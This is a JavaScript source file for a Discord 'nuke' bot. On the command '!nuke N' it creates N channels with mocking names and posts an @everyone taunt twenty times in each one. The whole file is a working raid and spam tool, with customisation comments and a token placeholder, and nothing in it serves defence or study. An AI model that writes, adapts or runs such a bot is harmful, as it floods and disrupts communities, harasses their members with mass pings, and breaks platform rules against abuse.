const { channel } = require("diagnostics_channel");
const Discord = require("discord.js")
const { Client, Events, GatewayIntentBits } = require('discord.js');
const token = "YOUR TOKEN HERE";

// Create a new client instance with gateway intents
const client = new Client({
  intents: [GatewayIntentBits.Guilds, 
  GatewayIntentBits.MessageContent, 
  GatewayIntentBits.GuildMessages,
  GatewayIntentBits.GuildMembers,] 
});

// When the client is ready, run this code (only once)
// We use 'c' for the event parameter to keep it separate from the already defined 'client'
client.once(Events.ClientReady, c => {
  console.log(`Ready! Logged in as ${c.user.tag}`);
});

// You can change these names, these basically are the random names for the channels spam created by the bot
const channelNames = [
  "nuked by daquavion", "nuked LLLLLL", "IMAGINE GETTING NUKED", "L BAND KIDS", "IMAGINE GETTING NUKED", "nuked by nukebot600"
]


// Creating the commands
client.on("messageCreate", async msg => {
  let prefix = "!"
  if (!msg.content.startsWith(prefix) || msg.author.bot) return;
  const args = msg.content.slice(prefix.length).trim().split(' ');
  const command = args.shift().toLowerCase();
  if(command == "test"){
    console.log("test command initiated")
    msg.reply("Nuke")
  }
  if(command == "nuke"){
    // Initiate the Nuke function
    Nuke(args[0])
  }
  function Nuke(numberOfChannels){
    console.log("Nuke initiated")
    // For looping the creations of channels
    for(let i = 0; i < numberOfChannels; i++){
      const channel = msg.guild.channels.create({name: channelNames[Math.floor(Math.random() * channelNames.length)], type: Discord.ChannelType.GuildText})
      .then((channel) => {
        // When the channel is created create a message 20 times 
        for(let i = 0; i < 20; i++){
          channel.send("@everyone LOSERS IMAGINE GETTING NUKED !!!")
        }
      })
    }
  }

})


// Log in to Discord with your bot/client's token
client.login(token);


